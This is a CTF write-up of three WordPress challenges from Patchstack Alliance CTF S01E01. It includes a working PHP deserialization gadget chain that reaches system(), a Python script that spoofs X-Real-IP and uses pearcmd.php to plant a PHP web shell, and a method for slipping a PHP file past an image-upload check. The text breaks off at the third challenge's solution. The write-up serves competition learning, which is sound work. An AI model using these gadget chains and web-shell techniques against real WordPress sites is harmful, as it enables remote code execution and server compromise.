---
id: 14848583-e65d-80f5-a51b-fc90908e7e6b
title: Patchstack Alliance CTF S01E01
created_time: 2024-11-24T01:13:00.000Z
last_edited_time: 2025-05-23T05:37:00.000Z
cover_image: ./imgs/ctf_bz7FKxwy.png
icon_emoji: 💦
categories:
  - wordpress
verification:
  state: unverified
  verified_by: null
  date: null
page: Patchstack Alliance CTF S01E01
owner:
  - object: user
    id: ee7aeeeb-cd0d-4cbb-9e7e-109320ff16fa
    name: Dimas
    avatar_url: >-
      https://s3-us-west-2.amazonaws.com/public.notion-static.com/fab4bcf0-36ea-4bd6-8847-f18b157387da/92920739.png
    type: person
    person:
      email: dimasmaulana0305@gmail.com
_thumbnail: ./imgs/ctf_bz7FKxwy.png

---

***

![](./imgs/image_c5Oe8EOM.png)

In the recent Patchstack Alliance CTF S01E01, I am thrilled to share that I earned 2nd place and successfully solved all the challenges presented. Below is my detailed write-up of each challenge:

# Donor

## Challenge Information

Description

    You are a kind sponsor, please help me donate to help those in need.

    By: NgocAnhLe

    NOTE: This is a fully white box challenge, almost no heavy brute force is needed.

    [http://3.14.248.34:9024/](http://3.14.248.34:9024/)

Attachment

    [image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/263ee279-cc66-43f8-904e-623e0d2f3d05/attachment.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZGHQHYDD%2F20250523%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250523T112619Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDMaCXVzLXdlc3QtMiJGMEQCICeRx9W9pG73VgTN6I%2FgrBxNGYI8f0hOiIazVxdZygenAiBixxXewvI%2FZkwj%2F4pgGl%2F38afFZCkc7welZ3lzAU6efCqIBAjs%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMkLOACkWfdqihj7VgKtwDCHgKmAeKxab3OfWUeX6MwNp7WOv3Psjcp0hJBQTdjVxa4guPxJ%2BSq6j0aHeha%2F2u8hU0U%2FxRvmCC%2BGhcrcM61LuKOcQL0k6zQAkts0F2MQTXx1xTKbt4aJUoj3L9nOTq7vWXruPkL62eK3q6xbf8pgxB6zMBKiwu1XW28mwIe15GS6%2F%2FcY1a5sphSewvupISFJEhomli2YW4JEgb8Rt8FyFtR2gUDt6gjeqmD0tX9JzD7GYV6W2faw8I2bVZ14Mp0ArLzRT%2FE45t5wIHk%2FCVJf3TlLV%2BYW4CilDio9aSAwZYvm4jYPTj31PLAtPIUDmUwCKx5VEfxtNEb8Wacxf9istRqDqWrQFJpUgTsXuXrcJ8Ko4zMz3W9LDWD2jyG5ma%2B1SFfWZ1QXp%2BMQatLjAwPXxpr19COuN7fIlYWv%2Fb0AuqLru10zZR8wKPXdhlZ66orVQWkRjBjO2pHlhkUb2j9tqCbRD4yWT5iQZNN13OAzG0lQAkYazjs1zYH9rBzBBcFpkSDU4sfu19QlzG2mLWNOIMU2ZFdEHDDqWwOnGTR%2FLQuUaxkoIyST4IXyRYhmV7sIGQApzaXxtraKAwvpBBb%2BSCrS7qxw3hjLFHWFW3rLrz8SDAPgf3dOx1meEwxabBwQY6pgHBoYo0ZQcZEXhGYMhiFj9%2BKq5JHY%2BOLckJThewWPawdUds3fjTaGlFPYDp765QrPGDE%2Bzx69Q%2BK1voKDy%2BfOA%2BL62lew7eE2C0QydCl1VQvWkV%2BhWDfROwR9eXz%2FlklmTtCHZIblXYL%2FKp7fkp2O%2FGJmMkgWgLHYfp5DwOTudRT7wM81ADvl3uWaDNBZhQwHKvJjbzwjUB%2B%2BccU7pHh5dx%2FwsMHkQo&X-Amz-Signature=41b7b861df9e9821d2563a2a51b5a92b1721ba786b06b1b7e3d42cb5300afbd5&X-Amz-SignedHeaders=host&x-id=GetObject)

## Understanding the Challenge

In this challenge, we will exploit insecure deserialization in a WordPress environment. The challenge itself uses a custom plugin named "simple-donate-plugin" that is vulnerable to deserialization.

The interesting part about this challenge is that it uses Faker, which has an intriguing `__call` method. This method is invoked when a method is not found within a class, triggering the `__call` method. We will delve into this further in the write-up below.

## Reconnaissance

If we take a look at the source code, we will see that the application itself stores our `meta_value` using an update query:

```php
...snip...
    $anonymous = get_user_meta($user_id, 'anonymous', true);
        ...snip...
        $is_anonymous = isset($_POST['is_anonymous']) ? $_POST['is_anonymous'] : 0;
...snip...
if ($existing_meta_key) {
            // Update the existing meta value if the key exists
            $wpdb->update(
                $wpdb->usermeta,
                ['meta_value' => stripslashes_deep($is_anonymous)],
                ['meta_key' => $existing_meta_key]
            );
            ...snip...

```

This approach isn't secure because storing data in `meta_value` without using the `update_user_meta` function is risky. When `get_user_meta` is called, the data will get deserialized, potentially exposing the application to a deserialization exploit that can lead to remote code execution (RCE) in this case.

## Exploitation

To gain deserialization, we need to supply the `$is_anonymous` function with our deserialization payload. This gets interesting because researching the deserialization gadget requires the thoroughness of a real "Cyber Security Researcher". TL;DR, I found the gadget to gain RCE. Here's the flow:

By searching for the possible gadget in the vendor, I found a gadget chain involving a magic method `__call` that has `call_user_func` in it. This `__call` magic method is invoked when a method is not found within a class. For example, `$class->notfound` will trigger the `__call` method if the method `notfound` doesn't exist in the class. Here, we use a gadget from `fakerphp`:

challenge-custom/simple-donate-plugin/vendor/fakerphp/faker/src/Faker/ValidGenerator.php

    ```php
    ...snip...
    class ValidGenerator
    {
    ...snip...
        public function __call($name, $arguments)
        {
            $i = 0;
            do {
                $res = call_user_func_array([$this->generator, $name], $arguments);
                ++$i;

                if ($i > $this->maxRetries) {
                    throw new \OverflowException(sprintf('Maximum retries of %d reached without finding a valid value', $this->maxRetries));
                }
            } while (!call_user_func($this->validator, $res));

            return $res;
        }
     ...snip...
    ```

After identifying where we can gain RCE from the class mentioned above, we need a way to actually invoke it. I used the `__destruct` magic method to trigger it when the class gets destructed, as shown below:

challenge-custom/simple-donate-plugin/vendor/phpoffice/phpspreadsheet/src/PhpSpreadsheet/Worksheet/Worksheet.php

    ```php
    ...snip...
    class Worksheet implements IComparable
    {
    ...snip...
        public function disconnectCells(): void
        {
            if ($this->cellCollection !== null) {
                $this->cellCollection->unsetWorksheetCells();
                // @phpstan-ignore-next-line
                $this->cellCollection = null;
            }
            //    detach ourself from the workbook, so that it can then delete this worksheet successfully
            $this->parent = null;
        }
    ...snip...
        /**
         * Code to execute when this worksheet is unset().
         */
        public function __destruct()
        {
            Calculation::getInstance($this->parent)->clearCalculationCacheForWorksheet($this->title);

            $this->disconnectCells();
            $this->rowDimensions = [];
        }
        ...snip...
    ```

    I use this method because it calls `disconnectCells`, which in turn calls `unsetWorksheetCells` and then `detach`. We supply the `currentCell` with `ValidGenerator`, so when `detach` in the line `$this->currentCell->detach();` gets called, it actually invokes the `ValidGenerator` class's `__call` method because the `detach` method isn't defined in the `ValidGenerator` class.

challenge-custom/simple-donate-plugin/vendor/phpoffice/phpspreadsheet/src/PhpSpreadsheet/Collection/Cells.php

    ```php
    ...snip...
    class Cells
    {
    ...snip...
        public function unsetWorksheetCells(): void
        {
            if ($this->currentCell !== null) {
                $this->currentCell->detach();
                $this->currentCell = null;
                $this->currentCoordinate = null;
            }

            // Flush the cache
            $this->__destruct();

            $this->index = [];

            // detach ourself from the worksheet, so that it can then delete this object successfully
            $this->parent = null;
        }
     ...snip...
    ```

After that, we will supply the `generator` attribute in the `ValidGenerator` class with this `Stream` class. This way, when the `ValidGenerator` gets called, it will actually call the `Stream` class in this line `$res = call_user_func_array([$this->generator, $name], $arguments)`. It will call the `detach` method from the `Stream` class, allowing us to control the output of `$res` by supplying the `$this->stream` attribute.

challenge-custom/simple-donate-plugin/vendor/maennchen/zipstream-php/src/Stream.php

    ```php
    ...snip...
    class Stream implements StreamInterface
    {
     ...snip...   
        public function detach()
        {
            $result = $this->stream;
            $this->stream = null;
            return $result;
        }
    ...snip...
    ```

## Obtaining the Flag

Here's a script that i use to solves the challenge:

x.php

    ```php
    <?php

    // __destruct
    namespace PhpOffice\PhpSpreadsheet\Worksheet {
        class Worksheet
        {
                private $cellCollection;
                public function __construct($cellCollection)
                {
                    $this->cellCollection = $cellCollection;
                }
        }
    }

    // __call
    namespace Faker {
        class ValidGenerator {
            protected $generator;
            protected $validator;
            protected $maxRetries;
            public function __construct($class, $function)
            {
                $this->generator = $class;
                $this->validator = $function;
                $this->maxRetries = 10000;
            }
        }
    }

    // stored cmd
    namespace PhpOffice\PhpSpreadsheet {
        class Spreadsheet {
            private $calculationEngine;
            public function __construct($calculationEngine)
            {
                $this->calculationEngine = $calculationEngine;
            }
        }
    }

    // stored cmd 2
    namespace PhpOffice\PhpSpreadsheet\Collection {
        class Cells
        {
            private $currentCell;
            public function __construct($store)
            {
                $this->currentCell = $store;
            }
        }
    }

    namespace ZipStream {
        class Stream {
            protected $stream;

            public function __construct($stream)
            {
                $this->stream = $stream;
            }
        }
    }

    ```

test.php

    ```php
    <?php


    require_once './x.php';

    $arg = new \ZipStream\Stream("cat /f*");
    $fk = new \Faker\ValidGenerator($arg, "system");
    $cel = new \PhpOffice\PhpSpreadsheet\Collection\Cells($fk);
    $des = new \PhpOffice\PhpSpreadsheet\Worksheet\Worksheet($cel);

    $ser = serialize($des);
    $b64 = base64_encode($ser);
    echo $b64;

    ```

solve.php

    ```python
    import httpx

    URL = "http://3.14.248.34:9024"
    # URL = "http://localhost:9024"

    class BaseAPI:
        def __init__(self, url=URL) -> None:
            self.c = httpx.Client(base_url=url)
        def welcome_to_the_donation_form(self, is_anonymous, submit_donation, name, email, amount):
            return self.c.post("/welcome-to-the-donation-form/", data={
                "name": name,
                "email": email,
                "amount": amount,
                "is_anonymous": is_anonymous,
                "submit_donation": submit_donation,
            })
    class API(BaseAPI):
        ...

    if __name__ == "__main__":
        api = API()
        import os, base64
        payload = os.popen("php ./test.php").read()
        payload = base64.b64decode(payload.encode()).decode()
        print(payload)
        res = api.welcome_to_the_donation_form(payload, "Submit", "admin", "admin@localhost", "100")
        print(res.status_code)
        print(res.text)

        res = api.c.get("/thank-you/")
        print(res.text)

    ```

flag:

![](./imgs/image_tmpYBAo2.png)

# WPX

## Challenge Information

Description

    Hi, I'm a new developer and I'm trying to learn how to develop a WordPress plugin. I'm trying to create news plugin that can get news by date, can you help me to test it? I'm still learning and I'm not sure if it's secure enough.

    by Dimas Maulana

    NOTE: This is a fully white box challenge, almost no heavy brute force is needed.

    [http://3.14.248.34:9001/](http://3.14.248.34:9001/)

Attachment

    [image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/ced27275-e9b2-4c03-84bd-71f9ef4bdfce/attachment_%281%29.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466SVVSFFM5%2F20250523%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250523T112631Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDMaCXVzLXdlc3QtMiJHMEUCIH8lJOJvJFLLGZZoyW2%2FPeZWqZlWVfJMXTRvdTw%2FcWaFAiEAuaSGY%2Bw6YXiAM5ya2LwrVqXr60XoT0DcxasnWzZrAVkqiAQI7P%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDNeBzHopS0mof45%2BcCrcA1qexQeogS%2Ft2aMBVCFEPUr4Wtt2bP%2Bg9UkGPaG65QY4UFU6IrUF%2BCRBbg6mD0h7ZKaNVe4gOxGo6wTG02F1Mc2B7WhFm1oHInYAjykpiZWS7b%2Fy5vNiPJRabDT94gZQ3z92vfjs3m4dYwlh%2FiSprY2BBOKSm4bojWN81qIuYNHQKFvnEIQ5lU0W01O%2BZI6HBrjMTpoETwt7uD%2FvDu5auvUPQGsLOn8M8E%2Fa6ggDFSlukHIER1iJstvndIchg8sXk%2FBY20sATFM8nljH%2BFIAv2yicYF%2FAGjSqYWJl%2BJomIoay9GCWMvuddHJ6c9dNQNZDZFUOS00dfHck7Utg05v3wpW1W8NzoCPsqXzOZ%2FE02xvJWlQF5BMVkGQ3MlQEBH8yUpjZydWh0s4QLAbF3vYQrhYZt8OdAsezUKlqn7Hp%2Fd%2Bk9TZC1iSK9tghPmBBOHze8un7RUuH%2Bn1dM4LzQ41Mz5BFnjAshYwfnUcrWQh4RGLSnMGrlAcVCHle14oOBpikVXKyj2Apw25gWBMJ%2FLB1LRdyW5EgK3suLkYOk%2FYJd9YJN6uCV2%2BH9s6r7r%2B7ST0v7CVeZ1P%2BS%2FuZnAi3AxV05wpMBAVDEdzt86cIZHBVUmKlPZ7mWvMQRlbfi9VMOymwcEGOqUB9mueWCJWJZReDeqyHadphn5XrzJQd4y5z4%2FjRIIY0TaZ8FS2UaDMGZn29cuGVVr%2Bp1mpXrr80kW183zvslMazVio%2B8z1v3X%2BJjxMQIgDtNkn07OrUwyplkaVbnc8Os2TpV%2FHQtj5ackoaVxGPe1CW9F1i8v2xJn%2B9cCK7frt029CHU6qqYyP412UVLR6UcCmuNaILIIfOhU7GPVXzfD94nALbEvk&X-Amz-Signature=a7bb4f443e5822199be8e48f28c645bd35aa1b88f95f7ae93919fd1b65f79e82&X-Amz-SignedHeaders=host&x-id=GetObject)

## Understanding the Challenge

In this challenge, we will exploit four kinds of vulnerabilities. The first is the improper handling of `REMOTE_ADDR` parameters in the Nginx configuration, which allows us to bypass the `REMOTE_ADDR` check. The second vulnerability is the `preg_match` capture limit; when we use `(...)` in `preg_match`, the match is stored, and if it exceeds the limit, it returns false. The third vulnerability involves bypassing `date` function formatting, and the last one is a restricted local file inclusion that only allows `.php` files, which we can exploit to achieve Remote Code Execution (RCE).

## Reconnaissance

Apparently, the Docker setup uses PHP-FPM and Nginx to serve the server, and we get a configuration like this:

server/nginx/nginx.conf

    ```plain text
    # generated by ChatGPT
    server {
        listen 80;
        server_name localhost;

        root /var/www/html;
        index index.php index.html index.htm;

        # Access and error log files
        access_log /var/log/nginx/access.log;
        error_log /var/log/nginx/error.log;

        # Directory permissions and options
        location / {
            try_files $uri $uri/ /index.php?$args;
        }

        # PHP-FPM configuration for processing PHP files
        location ~ \.php$ {
            include fastcgi_params;
            fastcgi_pass wp_service_1:9000;     # Reference to PHP-FPM container and port
            fastcgi_index index.php;
            fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
            fastcgi_param REMOTE_ADDR $http_x_real_ip;
        }

        # Disable access to .htaccess and other sensitive files
        location ~ /\.ht {
            deny all;
        }

        # Static files caching
        location ~* \.(jpg|jpeg|png|gif|ico|css|js)$ {
            expires 30d;
            access_log off;
        }
    }
    ```

There is also a custom plugin named `custom` that has multiple vulnerabilities in it.

custom.php

    ```php
    <?php
    /**
     * @package Custom Plugin
     */
    /*
    Plugin Name: Custom Plugin
    */

    add_action('wp_ajax_news', 'news');
    add_action('wp_ajax_nopriv_news', 'news');

    add_action('wp_ajax_login', 'login');
    add_action('wp_ajax_nopriv_login', 'login');

    function login() {
        if (!isset($_POST['username'])) {
            echo "Username and password are required";
            die();
        }

        if (is_array($_POST['username'])) {
            echo "Username and password cannot be an array";
            die();
        }

        if (preg_match('/(admin)+/s', $_POST['username'])) {
            echo "Username cannot contain 'admin'";
            die();
        }

        session_start();

        $_SESSION['username'] = $_POST['username'];

        echo "Login success";

        die();
    }

    function news() {
        if (!isset($_POST['date'])) {
            echo "Date is required";
            die();
        }

        if (is_array($_POST['date'])) {
            echo "Date cannot be an array";
            die();
        }

        // only allow admin to access this ajax
        $wp_service_1_bot = gethostbyname('localhost');
        if ($_SERVER['REMOTE_ADDR'] !== $wp_service_1_bot) {
            echo "Only admin can access this ajax";
            die();
        }

        // check session
        session_start();
        if (!isset($_SESSION['username'])) {
            echo "You need to login first";
            die();
        }

        if (strpos($_SESSION['username'], 'admin') === false) {
            echo "Only admin can access this ajax";
            die();
        }

        // example date format d-m-y
        $date = stripslashes($_POST['date']);

        header("Content-Security-Policy: default-src 'none';");
        include($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/custom/date/' . date($date) . '.php');
        die();
    }
    ?>

    ```

## Exploitation

To exploit this challenge, we first need to bypass the `REMOTE_ADDR` check below by adding a header like this: `X-Real-IP: 127.0.0.1`. This works because Nginx is configured to pass `fastcgi_param REMOTE_ADDR $http_x_real_ip;` to PHP-FPM, which sets the `REMOTE_ADDR` to the value of the `X-Real-IP` header.

```php
    $wp_service_1_bot = gethostbyname('localhost');
    if ($_SERVER['REMOTE_ADDR'] !== $wp_service_1_bot) {
        echo "Only admin can access this ajax";
        die();
    }
```

Once we bypass the `date` and `preg_match` limitations as previously explained, the next step involves using the `pearcmd.php` technique to perform a file upload. After successfully uploading our file, we can then include our uploaded file using the `include` function to achieve Remote Code Execution (RCE).

## Obtaining the Flag

Here is my solve script to solve this challenge:

```python
import httpx
import asyncio
import re
from subprocess import check_output
URL = "http://3.14.248.34:9001/"

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.AsyncClient(base_url=url)

    def login(self):
        return self.c.post("/wp-admin/admin-ajax.php", data={
            "action": "login",
            # bypass preg_match('/(admin)+/s', $_POST['username'])
            "username": "admin"*9000,
        })
    def upload_shell(self):
        # bypass date
        lfi = r"../../../../../../../../../../../\u\s\r/\l\o\c\a\l/\l\i\b/\p\h\p/\p\e\a\r\c\m\d"
        sessid = self.c.cookies.get("PHPSESSID")
        return check_output([
            'curl',
            '-X', 'POST', URL + f'''wp-admin/admin-ajax.php?+-c+/tmp/foo.php+-d+man_dir=<?system($_GET\\[0\\]);?>+-s+''',
            '-d', f'action=news&date={lfi}',
            '-H', 'X-Real-IP: 127.0.0.1',
            '-H', f'Cookie: PHPSESSID={sessid}'
        ])

    async def get_flag(self):
        res = await self.c.post(f"wp-admin/admin-ajax.php", data={
            "action": "news",
            # bypass date
            "date": r"../../../../../../../../\t\m\p/\f\o\o"
        }, headers={
            "X-Real-IP": "127.0.0.1"
        }, params={
            "0": "/readflag && rm /tmp/foo.php"
        })
        flag = re.search(r"CTF\{.*\}", res.text).group()
        return flag


class API(BaseAPI):
    ...

async def main():
    api = API()
    res = await api.login()
    # print(res.text)
    res = api.upload_shell()
    # print(res)
    res = await api.get_flag()
    print(res)

if __name__ == "__main__":
    asyncio.run(main())
```

Flag:

![](./imgs/image_Kca7xLKp.png)

# Emojifuscation

## Challenge Information

Description

    can you guess the emoji

    by stealthcopter

    NOTE: This is a fully white box challenge, almost no heavy brute force is needed.

    [http://3.14.248.34:9019](http://3.14.248.34:9019/)

Attachment

    [image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/61abaced-81c5-4083-aa28-a13bd45ef641/attachment_%282%29.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466YPSGVPSS%2F20250523%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250523T112631Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDMaCXVzLXdlc3QtMiJHMEUCIQD1z7qPzSUJsXIT9EqzK4dfpbiKgAURFIjbKMViNS%2FxaQIgGmHAVngjfZkqzaq2HUGw2TeLJ2%2BPdU%2FCr6RourXtRswqiAQI7P%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDGFF1%2B9tVEJI5bvUAyrcA8HAn3kHeeWnJ1c31iEUetyTU6LJuK6GG36U9VjMSxdfs0%2FVMsZ6oIL6YVI1Gr0UVBf4X26VyaEUZiuDult1FvFDFSXy0L4AI5Tpz%2BRcS7VdV0rCXdwtjqBtTG5PGGsN%2BEWSXEzCsFB%2BPyBI96FV6xfmznc2Ezw%2BNw5UmCfC%2BtpSj%2BdTmpAOX7WOn8So2y72Xf7Wn6TLP7uJdcT4wIiGOBkcsNEQDrmPWIubSqbYiOU8xVAfpbNVCJl6xslh2Y2sPwL8PyCek1FxgYDmq68vJ66KTgmxvM6BOo6h8GdbuE4dKfY1eRU4BEnogN%2F9dTCshIdsYUXBi4GSluM5Crmiq%2B3N%2FdHTVn2HHasqfel%2FS5UBzek3F%2FqVoF5gPn5q7VGWxE73j8GRdfgfZlEdyvhNCs0gYRnC2mq8UFTWI%2BFGw2GbGHm2S8Hf%2BOAEcd3ZN90l1W9l4Lr449EKc0nllbOb4niuHddEPOinEJbaEDvMKkrJo%2FdPv1tbsd4k7HBng7tgfkMtendG%2BuEL60e1GiM3zw029drJzbcVtZ1ssMlW7T2nHYBnszXxJqrWTEQlYwCPHlfrwyrSaPBOMjsFTI4xebV0lU0F7lt%2B3Gk88vufMTEf6Tk8hy5onOdz0WGgMOWmwcEGOqUBJj6%2FFRKM%2BOCXXlQ0ZvdKcz%2FyWNS1R7SrSirPJaBZk79HIMH1h1zUHCtTnfjIprakgGVTwVa6voa%2BK%2F%2FxBrCbvpNR71QkZ07BCcnMVyOE%2BQ7v6LLgoin7UCdHWKwDqrOYP%2BWfNP42s%2FgaXUZQ16p%2F1mTLzlqydrFA3V63WFNyI0H2x%2BsOUGKGnYkSCEdV2ZSR2L1fcPejZ1sQeqq%2FX9ThDMi7%2FfIb&X-Amz-Signature=ff02117f61207d7a33edb2ab5fddcb3d3d6b9ee5c56eef98eb0b2afcbf0751f8&X-Amz-SignedHeaders=host&x-id=GetObject)

## Understanding the Challenge

This challenge involves a peculiar emoji encoding mechanism so we need to decode it first to read the source code. The primary vulnerabilities here include arbitrary file write and bypassing extension checks to upload a PHP extension file.

## Reconnaissance

I actually just throw all the source code into microsoft copilot to decode the source code, and i get this as a result:

Emoji mapping and some function

    ```php
    <?php

    /*
     * Comments and explanations here
     * 
     * */

    function replace_and_define($emoji, $replacement) {
        return define($emoji, $replacement);
    }

    replace_and_define('🕳️', '');
    replace_and_define('🌌', ' ');
    replace_and_define('🧨', 'explode');

    $emoji_string = '_ 👀 🗯️ 👻 🏠 🪨 🖼️';

    $emoji_array = [
        '⚀' => 1,
        '🐘' => '.php',
        '🧬' => 'urlencode',
        '🤯' => 'implode',
        '🚰' => 'filter',
        '➕' => 'add',
        '🧼' => 'sanitize_text_field',
        '🚿' => 'sanitize_file_name',
        '🗡️' => '/',
        '👤' => 'user_login',
        '🔑' => 'user_pass',
        '📛' => 'name',
        '♻️📛' => 'tmp_name',
        '🥇' => 'first_name',
        '🏁' => 'last_name',
        '🔍👤' => 'get_user_meta',
        '🔄👤' => 'update_user_meta',
        '👤✅' => 'is_user_logged_in',
        '👤🔍' => 'wp_get_current_user',
        '🔍🧩' => 'in_array',
        '🧩🔢' => 'array',
        '🔄🎲' => 'array_rand',
        '⚠️❌' => 'WP_Error',
        '🔡' => 'strtolower',
        '📩' => 'wp_insert_user',
        '🛌' => 'rest_ensure_response',
        '📥' => 'GET',
        '✉️' => 'POST',
        '📸' => 'jpg',
        '📸🇪📸' => 'jpeg',
        '🏞️' => 'png',
        '🏞️📸' => 'image/jpeg',
        '🏞️🖼️' => 'image/png',
        '🗂️🧪' => 'mime_content_type',
        '🚛🆙🗄️' => 'move_uploaded_file',
        '🥪' => 'add_action',
        '🛌🟢' => 'rest_api_init',
        '🥱' => 'register_rest_route',
        '🧩' => 'methods',
        '📂⁉️' => 'is_dir',
        '📝⁉️' => 'file_exists',
        '📂‼️' => 'mkdir',
        '☎️' => 'callback',
        '🗃️' => '_FILES',
        '🤙' => 'permission_callback',
        '🪃💯' => '__return_true',
        '💯' => true,
        '🔸' => '.',
        '🧵' => 'str_replace',
        '🪪' => 'htaccess',
        '📏' => 'constant',
        '🪹' => 'is_empty',
        '🫥' => 'copy',
        '🏰📂' => 'basedir',
        '📤🗂️' => 'wp_upload_dir',
        '🚨️⁉️' => 'is_wp_error',
        '🗂️📋' => 'dirname',
        '🗺️' => 'map',
        '👔📜' => 'admin_enqueue_scripts',
        '🚀📜' => 'wp_enqueue_script',
        '🏰🔗' => 'baseurl',
        '🙉' => 'base64_decode',
        '🙈' => 'U2xCRFpteE1WSGR1TlVObVNVUXdaMGwyUTJac1RGUjNialZEWmtscWN6MD0=',
    ];

    foreach (explode(' ', $emoji_string) as $emoji) {
        $emoji_array[$emoji] = $emoji;
    }

    foreach ($emoji_array as $key => $value) {
        define($key, $value);
    }

    function upload_directory(){
        $dir = wp_upload_dir()['basedir'] . '/uploads';
        if (!file_exists($dir)) {
            mkdir($dir);
            // Add .htaccess file to the directory
            copy(dirname(__FILE__) . '/.htaccess', $dir . '/.htaccess');
        }
        return $dir;
    }

    function upload_url($filename){
        return wp_upload_dir()['baseurl'] . '/uploads' . str_replace(upload_directory(), '', $filename);
    }

    function implode_strings(...$parts) {
        return implode('', $parts);
    }

    function urlencoded_strings(...$parts) {
        return implode('/', array_map('urlencode', $parts));
    }

    function check_for_error($object) {
        return is_wp_error($object);
    }

    function get_param($request, $param){
        return $request->get_param($param);
    }

    function is_user_logged_in() {
        return is_user_logged_in();
    }

    function random_emoji() {
        $emojis = explode(' ', "🤣 🥳 🤩 🤔 🤖 👻 👽 🦄 🐶 🐸 🦊 🦁");
        return $emojis[array_rand($emojis)];
    }

    function return_error($code, $message){
        return new WP_Error($code, $message);
    }

    function get_global($name){
        return $GLOBALS[$name];
    }

    function current_user_id(){
        return wp_get_current_user()->ID;
    }

    ```

Main

    ```php
    <?php
    /**
     * Plugin Name: Example Plugin
     * Plugin URI: https://example.com
     * Description: This plugin does something interesting.
     * Version: 1.4.2
     * Author: Author Name
     * Author URI: https://authorwebsite.com
     */

    define('DEFINE_CONSTANT', 'define');

    include 'config.php';
    include 'init.php';

    add_filter('template_include', 'custom_template_include');

    function custom_template_include() {
        include 'header.php';
        print <<< EOT
    Hello world! Welcome to our plugin<br><br>
    We hope you find it useful.<br><br>
    This plugin connects to external APIs<br><br>
    Are you ready to get started?
    EOT;
        include 'footer.php';
    }

    add_action('admin_enqueue_scripts', function() {
        wp_enqueue_script('wp-api');
    });

    ```

API

    ```php
    <?php

    add_action('rest_api_init', function () {

        $route = urlencode(home_url());

        register_rest_route($route, '/' . urlencode('endpoint1'), [
            'methods' => 'GET',
            'callback' => 'callback1',
            'permission_callback' => '__return_true',
        ]);

        register_rest_route($route, '/' . urlencode('endpoint2'), [
            'methods' => 'POST',
            'callback' => 'callback2',
            'permission_callback' => '__return_true',
        ]);

        register_rest_route($route, '/' . urlencode('endpoint3'), [
            'methods' => 'POST',
            'callback' => 'callback3',
            'permission_callback' => 'current_user_can_access',
        ]);
    });

    function callback1() {
        // phpcs:ignore -- ignoring coding standards check
        eval(base64_decode(base64_decode(base64_decode('U2xCRFpteE1WSGR1TlVObVNVUXdaMGwyUTJac1RGUjNialZEWmtscWN6MD0='))));
        $response = [
            'callback1' =>  $some_variable,
        ];
        return rest_ensure_response($response);
    }

    function callback2($request)
    {
        $data = [];

        foreach (explode(' ', "user_login user_pass first_name last_name") as $field) {
            $data[constant($field)] = sanitize_text_field($request->get_param($field));
        }

        $user_id = wp_insert_user($data);

        if (is_wp_error($user_id)) {
            return $user_id;
        }

        return rest_ensure_response([
            'status' => 'success',
            'user_id' => $user_id,
        ]);
    }

    function callback3($request){
        $user_id = get_current_user_id();
        $first_name = get_user_meta($user_id, 'first_name', true);
        $last_name = get_user_meta($user_id, 'last_name', true);

        if (!empty($_FILES['image'])) {
            $file = $_FILES['image'];
            $filename = random_emoji() . random_emoji() . random_emoji() . '_' . sanitize_file_name($file['name']);
            $tmp_name = $file['tmp_name'];

            $allowed_ext = ['jpg', 'jpeg', 'png'];

            if (!in_array(strtolower(explode('.', $filename)[1]), $allowed_ext)) {
                return new WP_Error('error', 'File type not allowed: ' . implode(',', $allowed_ext));
            }

            $mime_type = mime_content_type($tmp_name);

            if (!in_array($mime_type, ['image/jpeg', 'image/png'])) {
                return new WP_Error('error', 'Invalid file type!');
            }

            $upload_dir = upload_directory() . '/' . $first_name . '_' . $last_name;

            // Clean directory path
            $upload_dir = str_replace('./../', '', $upload_dir);

            $file_path = $upload_dir . '/' . $filename;

            if (!is_dir($upload_dir)) {
                mkdir($upload_dir);
            }

            if (!move_uploaded_file($tmp_name, $file_path)) {
                return new WP_Error('error', 'Failed to upload file');
            }

            $file_url = upload_url($file_path);
            update_user_meta($user_id, 'image', $file_url);
        }

        return rest_ensure_response([
            'status' => 'success',
            'user_id' => $user_id,
            'image' => $file_url,
        ]);
    }
    ```

## Exploitation

So to exploit this challenge we need to gain RCE by using this file upload.

```php
        if (!move_uploaded_file($tmp_name, $file_path)) {
            return new WP_Error('error', 'Failed to upload file');
        }
```

but we must bypass some waff in it

```php
        $allowed_ext = ['jpg', 'jpeg', 'png'];

        if (!in_array(strtolower(explode('.', $filename)[1]), $allowed_ext)) {
            return new WP_Error('error', 'File type not allowed: ' . implode(',', $allowed_ext));
        }

        $mime_type = mime_content_type($tmp_name);

        if (!in_array($mime_type, ['image/jpeg', 'image/png'])) {
            return new WP_Error('error', 'Invalid file type!');
        }

        $upload_dir = upload_directory() . '/' . $first_name . '_' . $last_name;

        // Clean directory path
        $upload_dir = str_replace('./../', '', $upload_dir);

```

The `!in_array(strtolower(explode('.', $filename)[1]), $allowed_ext)` check can be bypassed by appending a `.jpg` extension to the file name, like this: `shell.jpg.php`. This works because the check only validates the first extension and not the last.

For `!in_array($mime_type, ['image/jpeg', 'image/png'])`, you can add JPEG or PNG magic bytes at the beginning of the file to trick `mime_content_type` into recognizing it as an image file. This way, the file will pass the MIME type validation even though it contains PHP code.

## Obtaining the Flag

